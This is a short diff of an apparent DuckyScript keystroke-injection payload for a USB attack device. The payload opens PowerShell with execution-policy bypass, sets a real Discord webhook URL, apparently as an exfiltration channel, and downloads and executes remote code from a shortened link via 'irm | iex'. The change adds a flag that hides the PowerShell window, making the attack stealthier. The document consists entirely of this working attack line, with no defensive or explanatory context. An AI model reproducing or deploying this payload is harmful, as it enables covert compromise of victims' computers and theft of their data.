@@ -14,7 +14,7 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -C $dc='https://discordapp.com/api/webhooks/1362490554218447071/kmkBGWVfGQMptopezRGXxsWb3-Q8Ehj9Yu6L1UcwLh472l2bdkY1dolOKB98Q9Ym7EQD'; irm https://is.gd/zex1iP | iex
+STRING powershell -NoP -Ep Bypass -W H -C $dc='https://discordapp.com/api/webhooks/1362490554218447071/kmkBGWVfGQMptopezRGXxsWb3-Q8Ehj9Yu6L1UcwLh472l2bdkY1dolOKB98Q9Ym7EQD'; irm https://is.gd/zex1iP | iex
 ENTER
 
 
